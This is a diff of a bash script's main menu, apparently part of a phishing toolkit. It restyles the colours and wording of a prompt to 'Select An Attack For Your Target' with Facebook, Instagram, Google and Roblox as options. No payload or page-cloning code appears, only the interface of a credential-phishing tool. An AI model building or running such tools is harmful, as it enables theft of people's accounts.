@@ -532,16 +532,19 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram
-		${RED}[${WHITE}03${RED}]${ORANGE} Google
-		${RED}[${WHITE}35${RED}]${ORANGE} Roblox
+		${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}
+		${GREEN}${BOLD}:: Select An Attack For Your Target ::${RESET}
+		${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}
 
-		${ORANGE} Ctrl + C Exit
+		${CYAN}[01]${RESET} ${WHITE}Facebook${RESET}
+		${CYAN}[02]${RESET} ${WHITE}Instagram${RESET}
+		${CYAN}[03]${RESET} ${WHITE}Google${RESET}
+		${CYAN}[35]${RESET} ${WHITE}Roblox${RESET}
 
-	EOF
+		${GRAY}Ctrl + C to Exit${RESET}
+
+EOF
 	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
